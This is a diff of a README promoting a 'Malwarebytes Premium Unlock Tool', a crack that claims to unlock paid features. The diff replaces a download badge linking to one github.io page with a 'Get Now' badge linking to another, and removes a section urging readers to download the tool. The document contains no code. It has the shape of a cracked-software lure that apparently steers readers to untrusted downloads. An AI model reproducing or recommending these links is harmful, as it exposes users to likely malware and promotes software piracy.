@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ Malwarebytes Premium Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://malwarebytes-premium-down-load.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Malwarebytes%20Premium%20Unlock%20Tool-Enable%20All%20Features-0078D6?style=for-the-badge&logo=malwarebytes&logoColor=white" 
-         alt="Download Malwarebytes Premium Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://unovoto390.github.io/.github/malwarebytes-premium)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -89,13 +84,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or suggest improvements via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock Malwarebytes Premium – Complete Protection
-
-Unlock all premium features of Malwarebytes, including real-time malware blocking, ransomware protection, and phishing defense.  
-[Download the Unlock Tool](https://malwarebytes-premium-down-load.github.io/.github/) and secure your PC instantly.
 
 ---
 
